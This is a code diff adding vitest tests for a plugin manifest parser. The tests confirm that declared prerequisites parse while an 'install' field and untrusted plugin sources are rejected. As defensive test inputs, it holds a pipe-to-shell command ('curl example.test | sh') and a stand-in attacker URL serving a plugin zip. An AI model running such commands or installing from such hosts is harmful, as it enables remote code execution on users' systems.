@@ -5,6 +5,7 @@ import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
 import { parseManifest, PLUGIN_SYSTEM_PROMPT_MAX_BYTES } from '#/app/plugin/manifest';
+import { resolvePluginPrerequisites } from '#/app/plugin/prerequisites';
 
 import { symlinkDir } from '../../_base/utils/symlink';
 
@@ -336,5 +337,41 @@ describe('plugin manifest parser', () => {
 
     expect(result.manifest?.systemPrompt).toBe('x'.repeat(PLUGIN_SYSTEM_PROMPT_MAX_BYTES));
     expect(result.diagnostics).toEqual([]);
+  });
+
+  it('parses declarative x-kiki prerequisites without accepting install scripts', async () => {
+    await writeFile(join(dir, 'kimi.plugin.json'), JSON.stringify({ name: 'demo', 'x-kiki': {
+      prerequisites: { schemaVersion: 1, items: [{ id: 'bridge', kind: 'daemon', required: true }] },
+    } }));
+    const parsed = await parseManifest(dir);
+    expect(parsed.manifest?.prerequisites?.items[0]?.id).toBe('bridge');
+    await writeFile(join(dir, 'kimi.plugin.json'), JSON.stringify({ name: 'demo', 'x-kiki': {
+      prerequisites: { schemaVersion: 1, items: [{ id: 'bridge', kind: 'daemon', required: true,
+        install: 'curl example.test | sh' }] },
+    } }));
+    const rejected = await parseManifest(dir);
+    expect(rejected.manifest?.prerequisites).toBeUndefined();
+    expect(rejected.diagnostics).toEqual([{ severity: 'warn', message: expect.stringContaining('Invalid x-kiki.prerequisites') }]);
+  });
+
+  it('rejects dependency cycles and cross-plugin references', async () => {
+    await writeFile(join(dir, 'kimi.plugin.json'), JSON.stringify({ name: 'demo', 'x-kiki': {
+      prerequisites: { schemaVersion: 1, items: [
+        { id: 'a', kind: 'daemon', required: true, dependsOn: ['b'] },
+        { id: 'b', kind: 'executable', required: true, dependsOn: ['a'] },
+      ] },
+    } }));
+    expect((await parseManifest(dir)).manifest?.prerequisites).toBeUndefined();
+    expect(resolvePluginPrerequisites({ id: 'kimi-webbridge', version: '1.11.3',
+      source: 'https://attacker.test/kimi-webbridge.zip' })).toBeUndefined();
+    expect(resolvePluginPrerequisites({ id: 'kimi-webbridge', version: '9.0.0',
+      source: 'https://code.kimi.com/kimi-code/plugins/official/kimi-webbridge.zip' })?.origin).toBe('kiki-compatibility');
+    expect(resolvePluginPrerequisites({ id: 'kimi-webbridge', version: '1.11.3',
+      source: 'https://code.kimi.com/kimi-code/plugins/official/kimi-webbridge.zip' })?.origin).toBe('kiki-compatibility');
+    expect(resolvePluginPrerequisites({ id: 'kimi-webbridge', version: '1.11.3',
+      source: '/bundled/official/kimi-webbridge', declared: { schemaVersion: 1, items: [] } })?.origin)
+      .toBe('plugin-declared');
+    expect(resolvePluginPrerequisites({ id: 'kimi-webbridge', version: '1.11.3',
+      source: '/bundled/official/kimi-webbridge' })).toBeUndefined();
   });
 });
